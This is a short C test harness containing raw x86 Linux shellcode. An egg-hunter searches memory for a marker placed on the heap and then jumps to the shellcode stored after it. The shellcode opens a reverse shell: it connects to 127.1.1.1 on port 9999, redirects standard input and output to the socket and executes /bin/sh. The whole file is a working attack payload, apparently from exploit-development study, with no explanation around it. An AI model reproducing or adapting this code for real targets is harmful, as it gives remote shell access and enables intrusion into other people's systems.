#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EGG "\x90\x50\x90\x50"

unsigned char egg[] = EGG;
unsigned char egg_hunter [] = "\xfc\x31\xc9\x31\xd2\x66\x81\xc9\xff\x0f\x41\x75\x01\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char shellcode[] = \
"\x6a\x66\x58\x89\xc7\x6a\x01\x5b\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x89\xf8\x6a\x03\x5b\x68\x7f\x01\x01\x01\x66\x68\x27\x0f\x6a\x02\x59\x66\x51\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80";

int main()
{
  printf("Egghunter Length:  %d\n", sizeof(egg_hunter) - 1); 
  
  char *heap;
  heap=malloc(300);
 
  printf("Memory location of shellcode: %p\n", heap);
 
  memcpy(heap + 0, egg, 4);
  memcpy(heap + 4, egg, 4);
  memcpy(heap + 8, shellcode, sizeof(shellcode) + 1);
 
  int (*ret)() = (int(*)())egg_hunter;
  ret();
}
